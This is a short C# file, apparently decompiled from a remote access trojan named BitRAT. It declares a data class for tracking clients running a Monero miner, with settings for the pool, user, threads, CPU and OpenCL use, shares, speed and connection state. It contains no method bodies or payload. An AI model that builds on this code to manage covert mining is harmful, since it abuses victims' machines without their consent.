﻿namespace BitRAT
{
    using System;

    public class cMinerXMRcli
    {
        public string[] idxValues;
        public string Key;
        private string m_user;
        private string m_threads;
        private string m_pool;
        private string m_algo;
        private string m_opencl;
        private string m_cpu;
        private string m_shares;
        private string m_donate;
        private string m_speed;
        private string m_duration;
        private string m_tag;
        public bool bJustConnected;
        public bool pending_dc;
        public bool pending_dc_timeout;
        public bool rejected;

        public cMinerXMRcli();

        public string USER { get; set; }

        public string THREADS { get; set; }

        public string POOL { get; set; }

        public string ALGO { get; set; }

        public string OPENCL { get; set; }

        public string CPU { get; set; }

        public string SHARES { get; set; }

        public string DONATE { get; set; }

        public string SPEED { get; set; }

        public string DURATION { get; set; }

        public string Tag { get; set; }
    }
}

